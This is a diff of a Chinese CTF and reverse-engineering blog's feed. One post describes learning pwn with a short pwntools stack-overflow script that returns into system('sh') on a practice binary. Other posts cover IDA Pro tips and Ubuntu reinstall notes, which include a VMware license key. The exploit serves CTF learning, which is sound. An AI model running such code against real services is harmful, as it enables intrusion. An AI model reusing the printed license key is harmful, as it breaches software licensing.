@@ -4,7 +4,7 @@
   <subtitle><![CDATA[reverse! reverse! reverse!]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="http://yoursite.com/"/>
-  <updated>2016-04-19T17:20:26.000Z</updated>
+  <updated>2016-04-20T15:24:07.000Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -19,7 +19,7 @@
     <link href="http://yoursite.com/2016/04/19/pwn-experience/"/>
     <id>http://yoursite.com/2016/04/19/pwn-experience/</id>
     <published>2016-04-19T11:59:44.000Z</published>
-    <updated>2016-04-19T17:20:26.000Z</updated>
+    <updated>2016-04-20T15:24:07.000Z</updated>
     <content type="html"><![CDATA[<p>2个月没更新了blog，在<code>0CTF2016</code>上被虐得一塌糊涂，闭关修炼pwn，终于在<code>429ctf</code>上有了零突破,这是第一次在比赛中做出pwn。这标志着一个新的开始，加油！！！　　</p>
 <a id="more"></a>
 <p>对于一个reverser来说,学习pwn并不是很难,因为对汇编知识和系统架构已经有了一定的理解和掌握。一直未入门的原因是由于shellcode的构造太麻烦，练习不方便。和队友esrever10交流后，他介绍了几个很好用的工具（pwntools，capstone，ROPgadget等），这些工具给我带来很大的便利，可以愉快的练习了^_^。  </p>
@@ -28,7 +28,7 @@
 <p>而且可以指定特定平台，这样想要什么功能的 opcode 还不是信手拈来。而在构造exploit代码，pwntools提供的框架也十分的方便快捷。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'pwn1'</span>)</span><br><span class="line">pr = process(<span class="string">'./pwn1'</span>) </span><br><span class="line"><span class="comment"># pr = remote('120.27.144.177', 8000)</span></span><br><span class="line"></span><br><span class="line">addr_system = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">addr_sh = next(elf.search(<span class="string">'sh\0'</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">140</span>  + p32(addr_system) + p32(<span class="number">0xdeadbeaf</span>) + p32(addr_sh)</span><br><span class="line">pr.recvuntil(<span class="string">'input your name:'</span>)</span><br><span class="line">pr.sendline(payload)</span><br><span class="line">pr.recvuntil(<span class="string">':'</span>)</span><br><span class="line">pr.sendline(<span class="string">'1'</span>) </span><br><span class="line">pr.interactive()</span><br></pre></td></tr></table></figure>
 <p>远程和本地切换，只需要一个语句的改变;接收信息和发送信息十分方便;获得shell后可以进行手工交互（interactive）,这个设计太棒了。  </p>
-<p>开始学习原理和练习，栈溢出攻击很容易理解，但实践利用起来有些困难（ASLR，nx等），之后看了蒸米的《一步一步学ROP》系列，按照里面的讲解，自己做一边，对整个ROP有了一定理解。现在如果能发现程序的漏洞，也能写出exp来了。</p>
+<p>开始学习复习各种原理和练习，栈溢出攻击很容易理解，但实践操作起来有些困难（ASLR，nx等），之后看了蒸米的《一步一步学ROP》系列，按照里面的讲解，自己再做一遍，对ROP有了一定理解。现在如果能发现程序的漏洞，也能写出exp来了。</p>
 <h3 id="练习平台">练习平台</h3><ul>
 <li><a href="http://pwnable.kr/" target="_blank" rel="external">pwnable.kr</a></li>
 <li><a href="https://exploit-exercises.com/" target="_blank" rel="external">exploit-exercises</a></li>
@@ -61,7 +61,7 @@
     <link href="http://yoursite.com/2016/02/01/note-ida/"/>
     <id>http://yoursite.com/2016/02/01/note-ida/</id>
     <published>2016-02-01T11:33:24.000Z</published>
-    <updated>2016-02-29T15:37:12.000Z</updated>
+    <updated>2016-07-15T14:24:10.000Z</updated>
     <content type="html"><![CDATA[<p>IDA Pro做为最强大的静态逆向工具，熟悉它的各项功能有利于提高分析效率，在此总结一些小技巧。<br><a id="more"></a></p>
 <h3 id="0x1_导出数据">0x1 导出数据</h3><p>快速把内容导出成C语言形式，快捷键：Shift+E<br><img src="/2016/02/01/note-ida/1.jpg" alt="1.jpg" title=""></p>
 <h3 id="0x2_Patch内容">0x2 Patch内容</h3><p>对于花指令混淆，Patch为NOP指令极其方便，调用方式：Edit -&gt; Patch Program<br><img src="/2016/02/01/note-ida/2.png" alt="2.png" title=""></p>
@@ -117,7 +117,7 @@
     <link href="http://yoursite.com/2016/01/06/reinstall/"/>
     <id>http://yoursite.com/2016/01/06/reinstall/</id>
     <published>2016-01-06T12:37:26.000Z</published>
-    <updated>2016-03-29T14:35:15.000Z</updated>
+    <updated>2016-07-16T08:40:16.000Z</updated>
     <content type="html"><![CDATA[<p>元旦这几天为了把nvidia弄起来，折腾好久，结果把系统搞奔溃了。只好重装了，现在把重装后需要安装的软件和方式记录下。</p>
 <a id="more"></a>
 <h3 id="UEFI安装ubuntu">UEFI安装ubuntu</h3><p>关键要弄个efi分区 (ps:有时没有这个选项，猜想U盘要选UEFI启动，或者要联网)</p>
@@ -130,12 +130,15 @@
 <h3 id="安装emacs">安装emacs</h3><p>$ sudo apt-get install build-essential<br>$ sudo apt-get build-dep emacs24<br>从里面找最近的镜像 <a href="http://www.gnu.org/prep/ftp" target="_blank" rel="external">http://www.gnu.org/prep/ftp</a><br>$ wget <a href="http://mirrors.ustc.edu.cn/gnu/emacs/emacs-24.5.tar.xz" target="_blank" rel="external">http://mirrors.ustc.edu.cn/gnu/emacs/emacs-24.5.tar.xz</a><br>$ xz -d emacs-24.5.tar.xz<br>$ tar -xvf emacs-24.5.tar<br>$ rm emacs-24.5.tar<br>$ cd emacs-24.5<br>$ ./configure –prefix=/opt/emacs<br>$ make<br>$ sudo make install</p>
 <h3 id="安装VMware">安装VMware</h3><p><a href="http://www.linuxidc.com/Linux/2015-01/111791.htm" target="_blank" rel="external">http://www.linuxidc.com/Linux/2015-01/111791.htm</a><br>vmware workstation 11许可证密钥:1F04Z-6D111-7Z029-AV0Q4-3AEH8</p>
 <h3 id="搭建安卓开发环境">搭建安卓开发环境</h3><p><a href="http://jingyan.baidu.com/article/47a29f2434ff15c014239992.html" target="_blank" rel="external">http://jingyan.baidu.com/article/47a29f2434ff15c014239992.html</a></p>
-<h3 id="安装pip">安装pip</h3><p>$ sudo apt-get install python-pip python-dev build-essential<br>$ sudo pip install –upgrade pip<br>$ sudo pip install –upgrade virtualenv</p>
+<h3 id="安装pip">安装pip</h3><p>$ sudo apt-get install python-pip python-dev build-essential<br>$ sudo pip install –upgrade pip<br>$ sudo pip install –upgrade virtualenv<br>$ sudo apt-get install virtualenvwrapper</p>
 <h3 id="安装pwntools">安装pwntools</h3><p>$ sudo pip install pwntools<br><a href="https://github.com/aquynh/capstone" target="_blank" rel="external">https://github.com/aquynh/capstone</a></p>
+<h3 id="安装z3">安装z3</h3><p><a href="https://github.com/Z3Prover/z3" target="_blank" rel="external">https://github.com/Z3Prover/z3</a></p>
+<h3 id="安装angr">安装angr</h3><p><a href="http://docs.angr.io/INSTALL.html" target="_blank" rel="external">http://docs.angr.io/INSTALL.html</a></p>
 <h3 id="安装nodejs和hexo">安装nodejs和hexo</h3><p><a href="https://cnodejs.org/topic/53a92af6c3ee0b58203258fe" target="_blank" rel="external">https://cnodejs.org/topic/53a92af6c3ee0b58203258fe</a><br><a href="http://www.cnblogs.com/zhcncn/p/4097881.html" target="_blank" rel="external">http://www.cnblogs.com/zhcncn/p/4097881.html</a><br>npm install hexo-deployer-git –save<br>npm install hexo-generator-free –save<br>npm install hexo-generator-sitemap –save</p>
 <h3 id="安装Zeal">安装Zeal</h3><p><a href="https://zealdocs.org/download.html" target="_blank" rel="external">https://zealdocs.org/download.html</a><br>$ sudo add-apt-repository ppa:zeal-developers/ppa<br>$ sudo apt-get update<br>$ sudo apt-get install zeal</p>
 <h3 id="安装Ruby">安装Ruby</h3><p><a href="http://blog.csdn.net/chszs/article/details/42462517" target="_blank" rel="external">http://blog.csdn.net/chszs/article/details/42462517</a><br>rvm lst known<br>rvm install 2.1.4</p>
 <h3 id="安装metasploit">安装metasploit</h3><p><a href="http://www.darkoperator.com/installing-metasploit-in-ubunt/" target="_blank" rel="external">http://www.darkoperator.com/installing-metasploit-in-ubunt/</a><br><a href="https://ruby.taobao.org/" target="_blank" rel="external">https://ruby.taobao.org/</a><br>gem sources –add <a href="https://ruby.taobao.org/" target="_blank" rel="external">https://ruby.taobao.org/</a> –remove <a href="https://rubygems.org/" target="_blank" rel="external">https://rubygems.org/</a></p>
+<h3 id="安装sagemath">安装sagemath</h3><p><a href="http://www.sagemath.org/download-linux.html" target="_blank" rel="external">http://www.sagemath.org/download-linux.html</a><br>There is also a PPA for Ubuntu available. Install SageMath this way:<br>apt-add-repository -y ppa:aims/sagemath<br>apt-get update<br>apt-get install sagemath-upstream-binary</p>
 ]]></content>
     <summary type="html">
     <![CDATA[<p>元旦这几天为了把nvidia弄起来，折腾好久，结果把系统搞奔溃了。只好重装了，现在把重装后需要安装的软件和方式记录下。</p>]]>
